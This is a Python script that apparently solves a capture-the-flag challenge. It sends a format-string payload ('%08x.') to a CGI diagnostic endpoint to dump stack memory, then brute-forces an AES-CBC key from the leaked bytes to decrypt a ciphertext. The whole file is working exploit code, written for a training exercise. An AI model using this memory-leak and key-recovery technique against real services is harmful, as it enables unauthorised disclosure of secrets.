import urllib.request
import urllib.parse
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import struct

BASE = "http://millenium-messenger.hackday.fr:8000"

def get_stack_hex(count=50):
    url = f"{BASE}/cgi-bin/msn_diag?cmd=MSG&body=%2508x." * count
    with urllib.request.urlopen(url) as resp:
        content = resp.read().decode('latin-1')
        idx = content.find("DIAG ")
        if idx >= 0:
            return content[idx+5:].strip().split('.')
        return []

def decrypt(key, iv, ct):
    try:
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        return decryptor.update(ct) + decryptor.finalize()
    except:
        return None

ct_hex = "336879c45d3b02dcd2048688541269206e496787d0a0e77995e57df88391b40427b64eec09d0634ccb684d3ffb6e52561c3d99cb5cc23d5794e0f396d52ee9fd9a6483024ec36ca5180c7988579fa43a"
ciphertext = bytes.fromhex(ct_hex)
iv = b"Y2K_BuG_19990101"

print("--- Dumping stack and trying sliding windows of 16-byte keys ---")
stack = get_stack_hex(100)
# Convert stack words to bytes
stack_bytes = b"".join([struct.pack('<I', int(x, 16)) for x in stack if x and len(x) == 8])

for i in range(len(stack_bytes) - 15):
    key_cand = stack_bytes[i:i+16]
    res = decrypt(key_cand, iv, ciphertext)
    if res and b"Epoch" in res:
        print(f"FOUND KEY at offset {i}!")
        print(f"KEY: {key_cand.hex()}")
        print(f"Decrypted: {repr(res)}")
        break

# Also try the key "Y2K_BuG_19990101" (if IV and Key are the same)
print("\n--- Trying IV as Key ---")
res = decrypt(iv, iv, ciphertext)
if res: print(f"Result (IV=Key): {repr(res)}")

# Try scanning the BSS range again for any non-zero blocks
# I previously saw 0x08049530: 30313233...
# Let's try that sequence: b"0123456789:;<=>?"
print("\n--- Trying 0123456789:;<=>? ---")
res = decrypt(b"0123456789:;<=>?", iv, ciphertext)
if res: print(f"Result: {repr(res)}")
